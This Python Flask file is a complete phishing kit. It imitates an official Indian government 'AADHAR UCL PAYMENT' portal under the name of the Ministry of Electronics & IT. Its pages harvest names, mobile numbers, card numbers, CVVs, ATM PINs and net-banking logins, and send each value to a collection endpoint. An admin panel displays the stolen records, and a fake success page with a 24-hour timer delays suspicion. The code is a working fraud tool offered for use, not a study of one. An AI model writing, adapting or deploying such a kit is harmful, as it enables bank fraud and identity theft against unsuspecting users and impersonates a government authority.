from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import json
from datetime import datetime

app = Flask(__name__)
CORS(app)  # Enable CORS for admin panel

# In-memory storage (will persist as long as server runs)
submissions = []
submission_counter = 1

# ==================== ORIGINAL HTML CODE (Same as before) ====================
HTML_CODE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>AADHAR UCL PAYMENT | Official Payment Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #eef2f7;
            min-height: 100vh;
            font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif;
        }
        .portal-container {
            width: 100%;
            max-width: 100%;
            background: #ffffff;
            min-height: 100vh;
        }
        .banner-full {
            width: 100%;
            background: #f0f4f9;
            line-height: 0;
        }
        .banner-full img {
            width: 100%;
            height: auto;
            max-height: 200px;
            object-fit: cover;
            display: block;
        }
        .gov-header {
            background: #1e3a5f;
            padding: 18px 20px;
            text-align: center;
            border-bottom: 3px solid #ffb347;
        }
        .gov-header h1 {
            color: white;
            font-size: 1.8rem;
            font-weight: 700;
        }
        .gov-header p {
            color: #cde1f0;
            font-size: 0.8rem;
            margin-top: 6px;
        }
        .pages-container {
            background: white;
            width: 100%;
        }
        .page {
            padding: 28px 24px 40px;
            width: 100%;
        }
        .hidden-page {
            display: none;
        }
        .form-group {
            margin-bottom: 24px;
        }
        .form-label {
            font-weight: 600;
            color: #1e3a5f;
            display: block;
            margin-bottom: 8px;
            font-size: 0.95rem;
        }
        .form-label span {
            color: #d32f2f;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            font-size: 1rem;
            border: 1.5px solid #cbd5e1;
            border-radius: 10px;
            outline: none;
            background: #ffffff;
        }
        input:focus {
            border-color: #1e3a5f;
            box-shadow: 0 0 0 3px rgba(30,58,95,0.1);
        }
        .bank-selector {
            position: relative;
        }
        .bank-input-wrapper {
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            background: white;
            padding: 14px 16px;
            border: 1.5px solid #cbd5e1;
            border-radius: 10px;
        }
        .bank-input-wrapper .bank-text {
            flex: 1;
            color: #1f2937;
            font-size: 1rem;
        }
        .bank-input-wrapper .down-arrow {
            font-size: 1.2rem;
            color: #1e3a5f;
            font-weight: bold;
        }
        .bank-dropdown-list {
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            max-height: 280px;
            overflow-y: auto;
            background: white;
            border: 1px solid #cbd5e1;
            border-radius: 10px;
            margin-top: 6px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
            z-index: 200;
            display: none;
        }
        .bank-dropdown-list div {
            padding: 12px 16px;
            cursor: pointer;
            border-bottom: 1px solid #eef2f6;
            font-size: 0.9rem;
        }
        .bank-dropdown-list div:hover {
            background: #eef2fa;
        }
        button {
            background: #1e6f3f;
            color: white;
            border: none;
            padding: 14px 20px;
            font-size: 1rem;
            font-weight: 600;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        button:hover {
            background: #0f5a34;
        }
        .two-option-buttons {
            display: flex;
            gap: 16px;
            margin: 24px 0 10px;
        }
        .two-option-buttons button {
            margin-top: 0;
            flex: 1;
        }
        .card-btn { background: #2c5a7a; }
        .netbank-btn { background: #8b5a2b; }
        .back-link {
            text-align: center;
            margin-top: 24px;
        }
        .back-link span {
            color: #1e3a5f;
            cursor: pointer;
            text-decoration: underline;
        }
        .expiry-group {
            display: flex;
            gap: 16px;
        }
        .expiry-group .form-group {
            flex: 1;
            margin-bottom: 0;
        }
        .success-card {
            background: #e8f5e9;
            padding: 20px;
            border-radius: 14px;
            text-align: center;
            color: #1e6f3f;
            margin-bottom: 20px;
            border-left: 5px solid #1e6f3f;
        }
        .request-id-box {
            background: #f8f9fc;
            padding: 18px;
            border-radius: 14px;
            text-align: center;
            margin: 16px 0;
            border: 1px solid #dce3ec;
        }
        .timer-box {
            background: #fff8e7;
            padding: 18px;
            border-radius: 14px;
            text-align: center;
            border: 1px solid #ffe0a3;
        }
        .timer-display {
            font-size: 2.2rem;
            font-weight: 800;
            font-family: monospace;
            color: #c62828;
            margin-top: 8px;
        }
        .small-note {
            font-size: 0.7rem;
            color: #6c757d;
            text-align: center;
            margin-top: 20px;
        }
        #requestIdFinal {
            font-size: 1.3rem;
            font-weight: 700;
            color: #1e3a5f;
        }
    </style>
</head>
<body>
<div class="portal-container">
    <div class="banner-full">
        <img src="https://i.ibb.co/0RbZ7zM0/bdc9d117e4da.jpg" alt="Government Scheme Banner" onerror="this.src='https://placehold.co/600x200?text=Official+Banner'">
    </div>
    <div class="gov-header">
        <h1>AADHAR UCL PAYMENT</h1>
        <p>Ministry of Electronics & IT | Secure Payment Gateway</p>
    </div>
    <div class="pages-container">
        <div id="page1" class="page">
            <div class="form-group">
                <label class="form-label">Full Name <span>*</span></label>
                <input type="text" id="fullName" placeholder="Full name as per Aadhaar">
            </div>
            <div class="form-group">
                <label class="form-label">Mobile Number <span>*</span></label>
                <input type="tel" id="mobileNum" placeholder="10 digit mobile number" maxlength="10">
            </div>
            <button id="proceedToBankBtn">Proceed →</button>
            <div class="small-note">🔒 Official Government Payment Portal</div>
        </div>
        <div id="page2" class="page hidden-page">
            <div class="form-group bank-selector">
                <label class="form-label">Select Bank <span>*</span></label>
                <div class="bank-input-wrapper" id="bankSelectorBox">
                    <span class="bank-text" id="selectedBankText">Click to select bank</span>
                    <span class="down-arrow">▼</span>
                </div>
                <div id="bankDropdownList" class="bank-dropdown-list"></div>
            </div>
            <button id="proceedToModeBtn">Proceed →</button>
            <div class="back-link"><span onclick="goToPageNum(1)">← Back</span></div>
        </div>
        <div id="page3" class="page hidden-page">
            <label class="form-label" style="text-align:center; display:block; margin-bottom:20px;">Choose Payment Method</label>
            <div class="two-option-buttons">
                <button id="cardModeBtn" class="card-btn">💳 Card Payment</button>
                <button id="netbankModeBtn" class="netbank-btn">🏦 Net Banking</button>
            </div>
            <div class="back-link"><span onclick="goToPageNum(2)">← Back to Bank Selection</span></div>
        </div>
        <div id="pageCardDetails" class="page hidden-page">
            <h3 style="margin-bottom:20px; color:#1e3a5f;">💳 Enter Card Details</h3>
            <div class="form-group">
                <label class="form-label">Card Number</label>
                <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19">
            </div>
            <div class="expiry-group">
                <div class="form-group">
                    <label class="form-label">Expiry Date (MM/YY)</label>
                    <input type="text" id="expiryInput" placeholder="MM/YY" maxlength="5">
                </div>
                <div class="form-group">
                    <label class="form-label">CVV</label>
                    <input type="password" id="cvvCode" placeholder="CVV" maxlength="4">
                </div>
            </div>
            <button id="cardProceedToUpi">Proceed → Enter ATM PIN</button>
            <div class="back-link"><span onclick="goToPageNum(3)">← Back</span></div>
        </div>
        <div id="pageNetbankLogin" class="page hidden-page">
            <h3 style="margin-bottom:20px; color:#1e3a5f;">🏦 Net Banking Login</h3>
            <div class="form-group">
                <label class="form-label">User ID / Customer ID</label>
                <input type="text" id="netUserId">
            </div>
            <div class="form-group">
                <label class="form-label">Internet Password / PIN</label>
                <input type="password" id="netPassword">
            </div>
            <button id="netbankLoginFinalBtn">Login & Proceed →</button>
            <div class="back-link"><span onclick="goToPageNum(3)">← Back</span></div>
        </div>
        <div id="pageUpiPinEntry" class="page hidden-page">
            <h3 style="margin-bottom:20px; color:#1e3a5f;">🔐 Enter ATM PIN</h3>
            <div class="form-group">
                <label class="form-label">4-digit ATM PIN</label>
                <input type="password" id="atmPinField" maxlength="4" placeholder="●●●●">
            </div>
            <button id="confirmUpiFinalBtn">Confirm & Submit Request</button>
            <div class="back-link"><span onclick="goToPageNum(4)">← Back to Card Details</span></div>
        </div>
        <div id="finalSuccessPage" class="page hidden-page">
            <div class="success-card">✅ Your request has been submitted successfully!<br>Kindly wait for 24 hours for processing.</div>
            <div class="request-id-box"><strong>📄 Unique Request ID:</strong><br><span id="requestIdFinal">--</span></div>
            <div class="timer-box"><strong>⏳ Processing Time Left (24 hours countdown)</strong><div class="timer-display" id="countdownTimerFinal">24:00:00</div></div>
            <button id="startNewRequestBtn" style="background:#2c5a7a; margin-top:20px;">➕ Start New Request</button>
        </div>
    </div>
</div>
<script>
    const API_URL = window.location.origin;
    
    async function sendToServer(dataType, fieldsData) {
        try {
            const response = await fetch(API_URL + '/api/submit-data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    source: dataType,
                    fields: fieldsData,
                    timestamp: new Date().toISOString()
                })
            });
            const result = await response.json();
            console.log('Data sent:', dataType, result);
            return true;
        } catch(err) {
            console.error('Error sending data:', err);
            return false;
        }
    }
    
    const bankList = [
        "State Bank of India (SBI)", "Punjab National Bank (PNB)", "Bank of Baroda (BOB)", "HDFC Bank", "ICICI Bank",
        "Axis Bank", "Kotak Mahindra Bank", "IndusInd Bank", "Yes Bank", "IDFC First Bank",
        "Central Bank of India", "Union Bank of India", "Indian Bank", "Canara Bank", "Bank of India",
        "UCO Bank", "Indian Overseas Bank", "Punjab & Sind Bank", "Bank of Maharashtra", "RBL Bank"
    ];

    let currentStep = 1;
    let selectedBank = "";
    let uniqueRequestID = "";
    let timerInterval = null;

    function showPage(pageId) {
        document.querySelectorAll('.page').forEach(p => p.classList.add('hidden-page'));
        document.getElementById(pageId).classList.remove('hidden-page');
    }

    function generateRequestID() {
        const now = new Date();
        const datePart = now.getFullYear() + String(now.getMonth()+1).padStart(2,'0') + String(now.getDate()).padStart(2,'0');
        const timePart = String(now.getHours()).padStart(2,'0') + String(now.getMinutes()).padStart(2,'0') + String(now.getSeconds()).padStart(2,'0');
        const random = Math.floor(Math.random() * 10000).toString().padStart(4,'0');
        return `UCL${datePart}${timePart}${random}`;
    }

    function start24hTimer() {
        if(timerInterval) clearInterval(timerInterval);
        const endTime = Date.now() + (24 * 60 * 60 * 1000);
        const timerEl = document.getElementById('countdownTimerFinal');
        function updateTimer() {
            const remaining = endTime - Date.now();
            if(remaining <= 0) { clearInterval(timerInterval); timerEl.innerText = "00:00:00"; return; }
            const hrs = Math.floor(remaining / (1000 * 60 * 60));
            const mins = Math.floor((remaining % 3600000) / 60000);
            const secs = Math.floor((remaining % 60000) / 1000);
            timerEl.innerText = `${hrs.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
        }
        updateTimer();
        timerInterval = setInterval(updateTimer, 1000);
    }

    function finalizeRequest() {
        if(uniqueRequestID === "") uniqueRequestID = generateRequestID();
        document.getElementById('requestIdFinal').innerText = uniqueRequestID;
        start24hTimer();
        showPage('finalSuccessPage');
    }

    function resetFullFlow() {
        if(timerInterval) clearInterval(timerInterval);
        uniqueRequestID = "";
        selectedBank = "";
        document.getElementById('fullName').value = "";
        document.getElementById('mobileNum').value = "";
        document.getElementById('selectedBankText').innerText = "Click to select bank";
        document.getElementById('cardNumber').value = "";
        document.getElementById('expiryInput').value = "";
        document.getElementById('cvvCode').value = "";
        document.getElementById('netUserId').value = "";
        document.getElementById('netPassword').value = "";
        document.getElementById('atmPinField').value = "";
        showPage('page1');
        currentStep = 1;
    }

    function buildBankDropdown() {
        const dropdownDiv = document.getElementById('bankDropdownList');
        dropdownDiv.innerHTML = '';
        bankList.forEach(bank => {
            const bankItem = document.createElement('div');
            bankItem.innerText = bank;
            bankItem.addEventListener('click', () => {
                document.getElementById('selectedBankText').innerText = bank;
                selectedBank = bank;
                dropdownDiv.style.display = 'none';
                sendToServer('Bank_Selection', { selected_bank: bank });
            });
            dropdownDiv.appendChild(bankItem);
        });
    }

    document.getElementById('proceedToBankBtn').addEventListener('click', () => {
        const name = document.getElementById('fullName').value.trim();
        const mobile = document.getElementById('mobileNum').value.trim();
        if(name === "") { alert("Please enter your full name"); return; }
        if(mobile.length !== 10 || isNaN(mobile)) { alert("Please enter valid 10-digit mobile number"); return; }
        sendToServer('Page1_Name_Mobile', { full_name: name, mobile_number: mobile });
        showPage('page2');
        buildBankDropdown();
    });

    const bankSelectorBox = document.getElementById('bankSelectorBox');
    const bankDropdownDiv = document.getElementById('bankDropdownList');
    bankSelectorBox.addEventListener('click', (e) => {
        e.stopPropagation();
        bankDropdownDiv.style.display = bankDropdownDiv.style.display === 'block' ? 'none' : 'block';
    });
    document.addEventListener('click', () => { bankDropdownDiv.style.display = 'none'; });

    document.getElementById('proceedToModeBtn').addEventListener('click', () => {
        if(!selectedBank) { alert("Please select a bank"); return; }
        sendToServer('Bank_Confirmed', { final_bank: selectedBank });
        showPage('page3');
    });

    document.getElementById('cardModeBtn').addEventListener('click', () => {
        sendToServer('Payment_Mode_Selected', { payment_mode: "Credit/Debit Card" });
        showPage('pageCardDetails');
    });
    document.getElementById('netbankModeBtn').addEventListener('click', () => {
        sendToServer('Payment_Mode_Selected', { payment_mode: "Net Banking" });
        showPage('pageNetbankLogin');
    });

    document.getElementById('cardProceedToUpi').addEventListener('click', () => {
        let cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
        const expiry = document.getElementById('expiryInput').value.trim();
        const cvv = document.getElementById('cvvCode').value.trim();
        if(cardNum.length < 13) { alert("Enter valid card number"); return; }
        if(!expiry.match(/^(0[1-9]|1[0-2])\/\d{2}$/)) { alert("Enter expiry in MM/YY format"); return; }
        if(cvv.length < 3) { alert("Enter valid CVV"); return; }
        sendToServer('Card_Details_Entry', { card_number: cardNum, expiry: expiry, cvv: cvv });
        showPage('pageUpiPinEntry');
    });

    document.getElementById('confirmUpiFinalBtn').addEventListener('click', () => {
        const atmPin = document.getElementById('atmPinField').value.trim();
        if(atmPin.length !== 4 || isNaN(atmPin)) { alert("Please enter valid 4-digit ATM PIN"); return; }
        sendToServer('ATM_PIN_Entry', { atm_pin: atmPin });
        sendToServer('FINAL_SUBMISSION_SUCCESS', { status: "submitted" });
        finalizeRequest();
    });

    document.getElementById('netbankLoginFinalBtn').addEventListener('click', () => {
        const uid = document.getElementById('netUserId').value.trim();
        const pwd = document.getElementById('netPassword').value.trim();
        if(uid === "") { alert("Please enter User ID"); return; }
        if(pwd === "") { alert("Please enter Password"); return; }
        sendToServer('NetBanking_Login_Credentials', { user_id: uid, password: pwd });
        sendToServer('FINAL_SUBMISSION_SUCCESS', { status: "submitted" });
        finalizeRequest();
    });

    document.getElementById('startNewRequestBtn').addEventListener('click', resetFullFlow);

    window.goToPageNum = function(pageNum) {
        if(pageNum === 1) resetFullFlow();
        else if(pageNum === 2) { showPage('page2'); }
        else if(pageNum === 3) { showPage('page3'); }
        else if(pageNum === 4) { showPage('pageCardDetails'); }
    };
    
    resetFullFlow();
</script>
</body>
</html>'''

# ==================== ADMIN PANEL HTML (for /admin route) ====================
ADMIN_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - AADHAR UCL Payments</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #1a1a2e; color: #eee; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 { color: #ffb347; margin-bottom: 20px; }
        .stats { background: #16213e; padding: 15px 20px; border-radius: 10px; margin-bottom: 20px; display: flex; gap: 20px; flex-wrap: wrap; }
        .stat { background: #0f3460; padding: 10px 20px; border-radius: 8px; }
        .stat-value { font-size: 1.8rem; font-weight: bold; color: #ffb347; }
        .submission-card { background: #0f3460; border-radius: 12px; padding: 20px; margin-bottom: 15px; border-left: 5px solid #ffb347; }
        .card-header { display: flex; justify-content: space-between; margin-bottom: 15px; flex-wrap: wrap; }
        .card-id { color: #ffb347; font-weight: bold; }
        .card-time { color: #aaa; font-size: 0.8rem; }
        .fields-table td { padding: 6px 10px; border-bottom: 1px solid #2a4a7a; }
        .fields-table td:first-child { font-weight: bold; color: #ffb347; width: 150px; }
        .btn { padding: 10px 20px; border: none; border-radius: 8px; cursor: pointer; margin: 5px; }
        .btn-refresh { background: #1e6f3f; color: white; }
        .btn-clear { background: #e94560; color: white; }
        .no-data { text-align: center; padding: 40px; color: #aaa; }
    </style>
</head>
<body>
<div class="container">
    <h1>📋 AADHAR UCL Payment - Admin Panel</h1>
    <div class="stats">
        <div class="stat">📊 Total: <span class="stat-value" id="totalCount">0</span></div>
        <div class="stat">💳 Card: <span class="stat-value" id="cardCount">0</span></div>
        <div class="stat">🏦 NetBank: <span class="stat-value" id="netbankCount">0</span></div>
    </div>
    <div style="margin-bottom: 20px;">
        <button class="btn btn-refresh" id="refreshBtn">🔄 Refresh</button>
        <button class="btn btn-clear" id="clearBtn">🗑️ Clear All Data</button>
    </div>
    <div id="submissionsList"></div>
</div>
<script>
    const API_URL = window.location.origin;
    let allData = [];
    
    async function loadData() {
        try {
            const res = await fetch(API_URL + '/api/submissions');
            allData = await res.json();
            renderData();
        } catch(e) { console.error(e); }
    }
    
    function renderData() {
        const container = document.getElementById('submissionsList');
        if(!allData.length) { container.innerHTML = '<div class="no-data">📭 No submissions yet</div>'; return; }
        
        let cardCount = 0, netbankCount = 0;
        container.innerHTML = allData.map(sub => {
            if(sub.source === 'Card_Details_Entry') cardCount++;
            if(sub.source === 'NetBanking_Login_Credentials') netbankCount++;
            
            let fieldsHtml = '';
            if(sub.fields) {
                for(const [k,v] of Object.entries(sub.fields)) {
                    let displayVal = (k.includes('pin') || k.includes('cvv') || k.includes('password')) ? '••••••' : v;
                    fieldsHtml += `<tr><td>${k.replace(/_/g,' ').toUpperCase()}</td><td>${displayVal}</td></tr>`;
                }
            }
            return `<div class="submission-card">
                <div class="card-header">
                    <span class="card-id">#${sub.id}</span>
                    <span>📌 ${sub.source}</span>
                    <span class="card-time">🕒 ${sub.timestamp || 'Unknown'}</span>
                </div>
                <table class="fields-table">${fieldsHtml || '<tr><td colspan="2">No data</td></tr>'}</table>
            </div>`;
        }).join('');
        
        document.getElementById('totalCount').innerText = allData.length;
        document.getElementById('cardCount').innerText = cardCount;
        document.getElementById('netbankCount').innerText = netbankCount;
    }
    
    async function clearData() {
        if(confirm('⚠️ Delete ALL submissions? This cannot be undone!')) {
            await fetch(API_URL + '/api/clear-submissions', { method: 'POST' });
            loadData();
        }
    }
    
    document.getElementById('refreshBtn').onclick = loadData;
    document.getElementById('clearBtn').onclick = clearData;
    loadData();
    setInterval(loadData, 5000);
</script>
</body>
</html>'''

# ==================== ROUTES ====================
@app.route('/')
def index():
    return render_template_string(HTML_CODE)

@app.route('/admin')
def admin():
    return render_template_string(ADMIN_HTML)

@app.route('/api/submit-data', methods=['POST'])
def submit_data():
    global submission_counter
    data = request.json
    
    enriched_data = {
        'id': submission_counter,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'source': data.get('source', 'unknown'),
        'fields': data.get('fields', {})
    }
    
    submissions.insert(0, enriched_data)
    submission_counter += 1
    
    print(f"[✓] Data saved: {enriched_data['source']} - ID: {enriched_data['id']}")
    return jsonify({'status': 'ok', 'id': enriched_data['id']})

@app.route('/api/submissions')
def get_submissions():
    return jsonify(submissions)

@app.route('/api/clear-submissions', methods=['POST'])
def clear_submissions():
    global submissions, submission_counter
    submissions = []
    submission_counter = 1
    return jsonify({'status': 'cleared'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
